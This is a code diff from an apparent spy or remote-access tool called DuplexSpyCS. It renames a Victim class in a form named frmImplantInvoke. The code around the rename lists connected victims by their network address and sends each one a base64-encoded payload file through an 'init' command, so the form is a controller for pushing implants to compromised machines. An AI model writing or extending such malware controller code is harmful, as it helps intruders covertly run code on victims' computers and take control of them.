@@ -12,9 +12,9 @@ namespace DuplexSpyCS
 {
     public partial class frmImplantInvoke : Form
     {
-        private List<Victim> m_lVictim;
+        private List<clsVictim> m_lVictim;
 
-        public frmImplantInvoke(List<Victim> lVictim)
+        public frmImplantInvoke(List<clsVictim> lVictim)
         {
             InitializeComponent();
 
@@ -27,7 +27,7 @@ namespace DuplexSpyCS
         /// <param name="lVictim">List of victim.</param>
         /// <param name="szFileName">Payload file.</param>
         /// <param name="aszParams">Paramaters</param>
-        private void fnSendPayload(List<Victim> lVictim, string szFileName, string[] aszParams)
+        private void fnSendPayload(List<clsVictim> lVictim, string szFileName, string[] aszParams)
         {
             try
             {
@@ -36,7 +36,7 @@ namespace DuplexSpyCS
                 string szParams = clsEZData.fnListStrToStr(aszParams.ToList());
 
 
-                foreach (Victim v in lVictim)
+                foreach (clsVictim v in lVictim)
                 {
                     v.SendCommand($"init|{szParams}|{szB64Payload}");
                 }
@@ -49,7 +49,7 @@ namespace DuplexSpyCS
 
         private void fnSetup()
         {
-            foreach (Victim v in m_lVictim)
+            foreach (clsVictim v in m_lVictim)
             {
                 ListViewItem item = new ListViewItem(v.socket.RemoteEndPoint.ToString());
                 item.SubItems.Add("?");
@@ -75,7 +75,7 @@ namespace DuplexSpyCS
 
         private void button1_Click(object sender, EventArgs e)
         {
-            List<Victim> lVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (Victim)x.Tag).ToList();
+            List<clsVictim> lVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
             if (lVictim.Count == 0)
                 return;
 
